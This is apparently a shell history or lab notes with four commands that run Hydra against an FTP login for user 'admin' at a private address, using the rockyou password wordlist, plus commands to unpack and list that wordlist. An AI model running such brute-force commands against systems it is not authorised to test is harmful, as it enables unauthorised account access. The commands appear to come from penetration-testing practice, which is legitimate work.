hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.91.2
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 1 -W 10 ftp://192.168.91.2
ls /usr/share/wordlists/
